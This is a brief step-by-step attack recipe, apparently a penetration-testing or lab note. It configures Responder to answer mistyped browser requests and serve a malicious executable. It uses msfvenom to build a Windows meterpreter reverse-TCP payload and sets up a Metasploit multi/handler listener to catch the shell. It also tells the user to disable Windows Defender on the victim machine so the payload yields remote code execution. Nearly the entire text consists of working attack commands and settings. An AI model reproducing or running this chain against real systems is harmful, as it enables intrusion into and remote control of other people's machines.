1. Turn SMB and HTTP back on - gedit /usr/share/responder/Responder.conf
2. Create reverse shell payload on the kali machine - msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=[port] -f exe > payload.exe
3. Move the payload to the files folder of the responder - mv payload.exe /usr/share/reponder/files
4. Configure the responder to deliver the created reverse shell payload and to serve a prebuiled html page:
	nano /usr/share/responder/Responder.conf
	Serve-Exe = On
	Serve-Html = On
	ExeFilename = files/payload.exe
5. Execute responder to answer web requests - responder -I [interface] -w
6. Open a listener to catch the reverse TCP payload:
	msfconsole
	use exploit/multi/handler
	set payload windows/x64/meterpreter/reverse_tcp
	set LPORT [port]
	set LHOST [IP]
	run
7. Turn off the defender on the victim's client machine
8. Open internet explorer and mistype the URL bar for any random website
9. Open the payload to achieve RCE